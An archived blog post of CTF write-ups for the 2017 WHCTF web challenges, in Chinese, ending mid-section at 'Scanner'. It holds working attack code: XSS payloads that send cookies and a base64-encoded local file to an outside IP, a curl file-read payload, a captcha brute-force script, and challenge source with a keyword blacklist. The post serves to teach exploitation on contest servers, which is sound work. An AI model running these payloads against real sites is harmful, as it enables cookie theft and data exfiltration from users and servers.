<!DOCTYPE html>
<html lang="pt">

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>[2017WHCTF] Web详细复现(伪)WP | Pr0ph3t's blog</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
    <link rel="shortcut icon" href="/assets/images/favicon.png">

    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 

</head>


    <body>
      <div class="container">

        <header class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <h1 class="">Pr0ph3t</h1>
    <p>
    <span class="reserved">char</span> nick[<span class="number">7</span>] = <span class="string">"Pr0ph3t"</span>;
    </p>
    <p>
    printf(<a href="https://github.com/t3hp0rP" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
    </p>
    <p>
    printf(<span class="string">"<span class="reserved">%s\x40</span>pr0ph3t<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,<span class="string">"admin"</span>);
    </p>
    <!-- <p>
            printf(<a href="https://blog.pr0ph3t.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.pr0ph3t.com<span class="reserved">\n</span>"</span></a>,nick);
        </p> -->
    <p>
    puts(<a href="/assets/misc/pubkey.gpg.txt" target="_blank"><span class="string">"91B6 191A C2C3 285C 201D  801B B5A3 6B56 8528 E140"</span></a>);
    </p>
  </div>
</header>

<div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <div class="menu">
      <ul>
          <li><a href="/">home</a></li>
          <li><a href="/articles/">articles</a></li>
          <li><a href="/friendlink">friends</a></li>
      </ul>
    </div>
  </div>
</div>



        <div class="row">
          <div class="col-lg-8 col-lg-offset-2">
            <main>
            <div class="post">

  <header class="post-header">
    <h1>[2017WHCTF] Web详细复现(伪)WP</h1>
  </header>

  <article class="post-content">
  <div class="post">

  <header class="post-header">
    <p class="meta">
        Sep 20, 2017
        
        
        •
        <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#writeup" class="reserved">writeup</a>,</span><span><a href="/category/#old" class="reserved">old</a></span>
        
          <span id="/posts/WHCTF-Web%E8%AF%A6%E7%BB%86%E5%A4%8D%E7%8E%B0-%E4%BC%AA-WP/" class="leancloud_visitors" data-flag-title="[2017WHCTF] Web详细复现(伪)WP">
            Page view:
            <span class="leancloud-visitors-count"></span>
          </span>
        
    </p>
  </header>

  <article class="post-content">
  <p>这次Web。。。Orz真的做不出来啊！
所以大佬们一出的wp就赶紧屁颠屁颠去复现了。。。
复现完写下这些伪wp：(有些题目环境已经挂掉了没办法复现Orz)
本人菜鸡。。。Orz如有说错或者对题目理解错误请各位表哥一定要指正 感激不尽！</p>

<hr />

<h2 id="router">Router</h2>
<p>emmm过了好久才发现漏了一题Orz。。其实这题是最有趣的 可惜了现在找不到啥截图了。。
首先题目提供了一个url和一个附件</p>

<p>首先进去目标网站先扫一下扫到export.php 进去之后下载得到一个settings.conf文件，打开之后没啥用 不知道是啥
然后附件 binwalk一下之后出现了一个elf文件，checksec一下</p>

<p><img src="/assets/images/posts/2017/WHCTF-Web详细复现-伪-WP/1.png" alt="checksec" /></p>

<p>扔进gdb跑一下，在大概0x435f4c的位置程序会dump出一个settings.conf文件，然后在大概0x4013c3的位置栈中会出现账号密码</p>

<p><img src="/assets/images/posts/2017/WHCTF-Web详细复现-伪-WP/2.png" alt="username and password" />
直接拿这个账号密码登上去是登不了的，所以拿我们在export.php下载到的文件替换掉，看看能不能读取到里面的账号密码</p>

<p><img src="/assets/images/posts/2017/WHCTF-Web详细复现-伪-WP/3.png" alt="dump" /></p>

<p>结果读到了
<img src="/assets/images/posts/2017/WHCTF-Web详细复现-伪-WP/4.png" alt="pass" /></p>

<p>emmm我看其他大佬的wp里面密码是不一样的 估计是被搅屎改掉了 然后我上了之后也改掉了23333
之后在里面会有一个带有参数action的ajax交互，把action改成不存在的一个就能得到flag。。。Orz。。。逼死Web狗。。。</p>

<p>再说一个浩子哥哥发现的一个官方后门rce 详情：https://mp.weixin.qq.com/s/XBBx0rWZu9bAwt62F6Ai8g</p>

<hr />

<h2 id="cat">CAT</h2>

<ul>
  <li>
    <p>一开始以为这道题是常规的命令执行 然后简单的fuzz之后发现过滤了N多个字符，百思不得其解后主办方看不下去了，给了hint是<code class="highlighter-rouge">RTFM of PHP CURL</code>唔。。然后去看了挺久的手册。。发现还是没啥收获，然后思路就变成了用file协议去读文件 然后就跑偏了23333</p>
  </li>
  <li>
    <p>正确的思路应该是 将全部字符fuzz一遍 然后发现输入%FF报错，查看报错结果是Python Django，debug没关然后看到关键代码：</p>
  </li>
</ul>

<p><img src="/assets/images/posts/2017/WHCTF-Web详细复现-伪-WP/5.png" alt="debug" /></p>

<p>这里有疑问就是为什么会有/api/ping的请求呢？
因为我们在题目中并没有这样的url可以访问
并且在ping函数之前是执行了14-21行的代码合并了一个上传的文件(???我们没上传文件呀)
结合之前django报错并不是html渲染后的结果 而是类似于PHP的show_source(特殊符号被转译)和hint 这里就有理由充分猜测后台运行了两个应用，一个是暴露给我们的PHP应用，一个是处理通过PHP发送的请求的Django 这里没有报Invalid Url错误是因为在正则之前有一个转码的过程 Django使用的是GBK编码，而我们发送的%FF并不在其编码表中有意义，(%F7也是)所以就会转码错误，抛出django的exception，不会进入下一步的正则。
而关键部分就是PHP是使用CURL来请求django应用API的，这里触及到了一个知识盲区Orz 就是CURLOPT_POSTFILES
官方文档描述如下：</p>

<p><img src="/assets/images/posts/2017/WHCTF-Web详细复现-伪-WP/6.png" alt="RTFM" /></p>

<p>如果在请求前面加上@的话phpcurl组件是会把后面的当作绝对路径请求 结合GBK的特性如果遇到编码不了就会抛出错误的特性   也就是说如果我们去请求一个内容存在GBK不能编码的序列就能通过debug页面把文件内容爆出来,通过debug页面能得到绝对路径
emm然后比较容易想到的就是database.sqlite3文件了</p>
<ul>
  <li>poc：
<img src="/assets/images/posts/2017/WHCTF-Web详细复现-伪-WP/7.png" alt="poc" /></li>
</ul>

<p>(flag在右下角)</p>
<ul>
  <li>payload：?url=@/opt/api/database.sqlite3</li>
</ul>

<hr />

<h2 id="emmmm">Emmmm</h2>
<ul>
  <li>因为题目环境挂了 先挖坑。。以后搭好环境再填</li>
  <li>大佬们的做法是从phpinfo中获取到开启了xdebug远程调试，然后Vim+DBGP+xdebug进行远程执行代码</li>
</ul>

<hr />

<h2 id="not-only-xss">Not only XSS</h2>

<ul>
  <li>简单尝试了一下直接丢js代码发现是可用请求到的</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://139.199.206.219:2333/</span><span class="dl">"</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="/assets/images/posts/2017/WHCTF-Web详细复现-伪-WP/8.png" alt="结果" /></p>

<p>然后cookie是空的
Web服务器是PhantomJS
这个服务器有一个特点—PhantomJS是无界面浏览器（headless browser）客户端 支持file协议
所以是可以读取静态文件的
然后看到Referer很奇怪 是一个静态文件？
打开这个静态文件之后发现是我们刚才发送的内容
那这里大概能猜到bot是直接打开本地静态文件的
然后思路大概就出来了 去读源码
但是现在并不知道要读哪里的源码
扫一波(自家扫描器 <a href="https://github.com/Pr0phet/ProScanner">https://github.com/Pr0phet/ProScanner)</a>)
<img src="/assets/images/posts/2017/WHCTF-Web详细复现-伪-WP/9.png" alt="扫描器" /></p>

<p>扫出来flag.php 那估计是要读这里的源码了</p>
<ul>
  <li>payload：</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">file:///var/www/html/flag.php</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">content</span> <span class="o">=</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://139.199.206.219:2333/wtf.php?a=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">content</span><span class="p">;};</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<ul>
  <li>poc:</li>
</ul>

<p><img src="/assets/images/posts/2017/WHCTF-Web详细复现-伪-WP/10.png" alt="poc" /></p>

<p>base64解码后即为</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="nv">$flag</span><span class="o">=</span><span class="s2">"WHCTF</span><span class="si">{</span><span class="nv">phant0mjs_c4n_open_f1les_1n_webp4ge</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"Flag is here! But nobody can got it!"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>ps：附上自己写的爆破验证码的脚本，效率还阔以 4位数基本在10秒之内能爆破出来，5位数的话大概也是15秒-20秒左右, 当然。。全靠运气</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#coding:utf8
#Author: Pr0ph3t
# import requests
</span><span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="c1">#用法：python 此文件 想要爆破的验证码
</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">'http://web.jarvisoj.com:32800/'</span>

<span class="c1"># se = requests.Session()
# res = se.get(url)
# code = re.findall('.+substr\(\$verify,0,4\) === \'(.*)\'.+',res.content)[0]
</span><span class="n">preCode</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">numToCrack</span> <span class="o">=</span> <span class="mi">5</span> <span class="c1">#爆破的位数
</span>
<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
	<span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
	<span class="k">print</span> <span class="s">'[*] 第'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">'次碰撞'</span>
	<span class="n">testStr</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">sample</span><span class="p">(</span><span class="s">'qwertyuiopasdfghjklzxcvbnm1234567890'</span><span class="p">,</span><span class="n">numToCrack</span><span class="p">)).</span><span class="n">strip</span><span class="p">()</span>
	<span class="n">testCode</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">testStr</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="n">numToCrack</span><span class="p">]</span>
	<span class="k">if</span> <span class="n">testCode</span> <span class="o">==</span> <span class="n">preCode</span><span class="p">:</span>
		<span class="k">print</span> <span class="n">testStr</span>
		<span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>

<p>pss：对题目比较感兴趣所以把源码也读下来了</p>
<ul>
  <li>index.php</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">include</span><span class="p">(</span><span class="s2">"csp.php"</span><span class="p">);</span>
<span class="k">include</span><span class="p">(</span><span class="s2">"conn.php"</span><span class="p">);</span>

<span class="nb">session_start</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'verify'</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'phone'</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'secret'</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])){</span>
<span class="err"> </span> <span class="err">  </span><span class="nv">$name</span><span class="o">=</span><span class="nx">Filter</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]);</span>
<span class="err"> </span> <span class="err">  </span><span class="nv">$verify</span><span class="o">=</span><span class="nx">Filter</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'verify'</span><span class="p">]);</span>
<span class="err"> </span> <span class="err">  </span><span class="nv">$phone</span><span class="o">=</span><span class="nx">Filter</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'phone'</span><span class="p">]);</span>
<span class="err"> </span> <span class="err">  </span><span class="nv">$email</span><span class="o">=</span><span class="nx">Filter</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]);</span>
<span class="err"> </span> <span class="err">  </span><span class="nv">$secret</span><span class="o">=</span><span class="nx">Filter</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'secret'</span><span class="p">]);</span>
<span class="err"> </span> <span class="err">  </span><span class="k">if</span><span class="p">(</span><span class="nv">$name</span><span class="o">===</span><span class="s2">""</span><span class="o">||</span><span class="nv">$verify</span><span class="o">===</span><span class="s2">""</span><span class="o">||</span><span class="nv">$phone</span><span class="o">===</span><span class="s2">""</span><span class="o">||</span><span class="nv">$secret</span><span class="o">===</span><span class="s2">""</span><span class="o">||</span><span class="nv">$email</span><span class="o">===</span><span class="s2">""</span><span class="p">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err">  </span><span class="k">die</span><span class="p">(</span><span class="s2">"Please Complete the form!"</span><span class="p">);</span>
<span class="err"> </span> <span class="err">  </span><span class="p">}</span>
<span class="err"> </span> <span class="err">  </span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$verify</span><span class="p">),</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span><span class="o">!==</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'md5'</span><span class="p">]){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err">  </span><span class="k">die</span><span class="p">(</span><span class="s2">"verify error!"</span><span class="p">);</span>
<span class="err"> </span> <span class="err">  </span><span class="p">}</span>
<span class="err"> </span> <span class="err">  </span><span class="k">else</span><span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err">  </span><span class="nv">$id</span><span class="o">=</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$secret</span><span class="o">.</span><span class="nb">time</span><span class="p">()</span><span class="o">.</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100000</span><span class="p">));</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err">  </span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"insert into </span><span class="nv">$TBNAME</span><span class="s2"> values('"</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">"','"</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">"','"</span><span class="o">.</span><span class="nv">$email</span><span class="o">.</span><span class="s2">"','"</span><span class="o">.</span><span class="nv">$phone</span><span class="o">.</span><span class="s2">"','"</span><span class="o">.</span><span class="nv">$secret</span><span class="o">.</span><span class="s2">"',false);"</span><span class="p">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err">  </span><span class="k">die</span><span class="p">(</span><span class="s2">"Admin has got your secret and will read it soon."</span><span class="p">);</span>
<span class="err"> </span> <span class="err">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE HTML&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>Easy XSS game<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"css/style.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">media=</span><span class="s">"all"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Content-Type"</span> <span class="na">content=</span><span class="s">"text/html; charset=utf-8"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1, maximum-scale=1"</span><span class="nt">&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Content-Type"</span> <span class="na">content=</span><span class="s">"text/html; charset=utf-8"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"css/font-awesome.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"wthree-dot"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h1&gt;</span>Tell your secret to me<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"profile"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"wrap"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"contact-form"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"#"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"w3l-contact-left"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"styled-input agile-styled-input-top"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"name"</span> <span class="na">required=</span><span class="s">""</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;label&gt;</span>Name<span class="nt">&lt;/label&gt;</span>
                            <span class="nt">&lt;span&gt;&lt;/span&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"styled-input"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"email"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">required=</span><span class="s">""</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;label&gt;</span>Email<span class="nt">&lt;/label&gt;</span>
                            <span class="nt">&lt;span&gt;&lt;/span&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"styled-input"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"phone"</span> <span class="na">required=</span><span class="s">""</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;label&gt;</span>Phone<span class="nt">&lt;/label&gt;</span>
                            <span class="nt">&lt;span&gt;&lt;/span&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"styled-input"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"verify"</span> <span class="na">required=</span><span class="s">""</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;label&gt;</span>verify<span class="nt">&lt;/label&gt;</span>
                            <span class="nt">&lt;span&gt;&lt;/span&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
<span class="cp">&lt;?php</span>
<span class="nv">$rand</span><span class="o">=</span><span class="nx">generate_md5</span><span class="p">();</span>
<span class="k">echo</span> <span class="s2">"&lt;h2 style='color:#999999'&gt;( PS :substr(md5(</span><span class="se">\$</span><span class="s2">verify),0,5) === '"</span><span class="o">.</span><span class="nv">$rand</span><span class="o">.</span><span class="s2">"' )&lt;/h2&gt;"</span><span class="p">;</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'md5'</span><span class="p">]</span><span class="o">=</span><span class="nv">$rand</span><span class="p">;</span>
<span class="cp">?&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"w3l-contact-right"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"styled-input agileits-input"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"secret"</span> <span class="na">required=</span><span class="s">""</span><span class="nt">&gt;&lt;/textarea&gt;</span>
                            <span class="nt">&lt;label&gt;</span>Secret<span class="nt">&lt;/label&gt;</span>
                            <span class="nt">&lt;span&gt;&lt;/span&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"SEND"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"clear"</span><span class="nt">&gt;</span> <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/form&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div>

<ul>
  <li>csp.php</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';style-src 'self' 'unsafe-inline';img-src *;"</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<ul>
  <li>conn.php</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$DBHOST</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$DBUSER</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">;</span>
<span class="nv">$DBPASS</span> <span class="o">=</span> <span class="s2">"whctfxss"</span><span class="p">;</span>
<span class="nv">$DBNAME</span> <span class="o">=</span> <span class="s2">"xss"</span><span class="p">;</span>
<span class="nv">$TBNAME</span> <span class="o">=</span> <span class="s2">"xss"</span><span class="p">;</span>
<span class="nv">$TBCOLUMN</span><span class="o">=</span><span class="k">Array</span><span class="p">(</span>
<span class="err"> </span> <span class="err">  </span><span class="s2">"id"</span><span class="o">=&gt;</span><span class="s2">"id"</span><span class="p">,</span>
<span class="err"> </span> <span class="err">  </span><span class="s2">"name"</span><span class="o">=&gt;</span><span class="s2">"name"</span><span class="p">,</span>
<span class="err"> </span> <span class="err">  </span><span class="s2">"phone"</span><span class="o">=&gt;</span><span class="s2">"phone"</span><span class="p">,</span>
<span class="err"> </span> <span class="err">  </span><span class="s2">"secret"</span><span class="o">=&gt;</span><span class="s2">"secret"</span><span class="p">,</span>
<span class="err"> </span> <span class="err">  </span><span class="s2">"hasread"</span><span class="o">=&gt;</span><span class="s2">"hasread"</span><span class="p">,</span>

<span class="p">);</span>

<span class="k">function</span> <span class="nf">generate_md5</span><span class="p">(){</span>
<span class="nv">$number</span><span class="o">=</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1000000</span><span class="p">);</span>
<span class="nv">$rand</span><span class="o">=</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$number</span><span class="p">);</span>
<span class="k">return</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$rand</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
<span class="p">};</span>

<span class="k">function</span> <span class="nf">Filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">){</span>
<span class="err"> </span> <span class="err">  </span><span class="nv">$blacklist</span> <span class="o">=</span> <span class="s2">"sleep|benchmark|information|order|limit|load_file|select|union|system|alter|show|outfile|dumpfile|into|execute|column|table|extractvalue|floor|update|insert|delete"</span><span class="p">;</span>
<span class="err"> </span> <span class="err">  </span><span class="nv">$whitechar</span> <span class="o">=</span> <span class="s2">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'()._*`-@=+&gt;&lt;</span><span class="se">\"</span><span class="s2">{};/: ?,"</span><span class="p">;</span>
<span class="err"> </span> <span class="err">  </span><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err">  </span><span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="s2">"</span><span class="nv">$whitechar</span><span class="s2">"</span><span class="p">,</span><span class="nv">$string</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="o">===</span><span class="kc">false</span><span class="p">){</span>
<span class="k">return</span> <span class="s2">"hacker!"</span><span class="p">;</span>
<span class="p">}</span>
<span class="err"> </span> <span class="err">  </span><span class="p">}</span>
<span class="err"> </span> <span class="err">  </span><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="nv">$blacklist</span><span class="s2">/is"</span><span class="p">,</span><span class="nv">$string</span><span class="p">)){</span>
<span class="k">return</span> <span class="s2">"hacker!"</span><span class="p">;</span>
<span class="p">}</span>
<span class="err"> </span> <span class="err">  </span><span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$string</span><span class="p">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err">  </span><span class="k">return</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
<span class="err"> </span> <span class="err">  </span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err">  </span><span class="k">return</span> <span class="s2">""</span><span class="p">;</span>
<span class="err"> </span> <span class="err">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nv">$conn</span><span class="o">=</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$DBHOST</span><span class="p">,</span><span class="nv">$DBUSER</span><span class="p">,</span><span class="nv">$DBPASS</span><span class="p">);</span>

<span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"use </span><span class="si">{</span><span class="nv">$DBNAME</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
<span class="cp">?&gt;</span>

</code></pre></div></div>

<p>这里有遇到了一个问题就是poc换行之后不奏效
不知道各位表哥会不会遇到这个情况Orz</p>

<hr />

<h2 id="scanner">Scanner</h2>
<p>emmm这题环境也关掉了 无法复现。。
我一开始还天真的以为flag藏在各种各样的文件夹里面。。然后就去傻乎乎的改自己的扫描器。。。（还没改完）
但是根据表哥们的wp 思路大致是这样的：
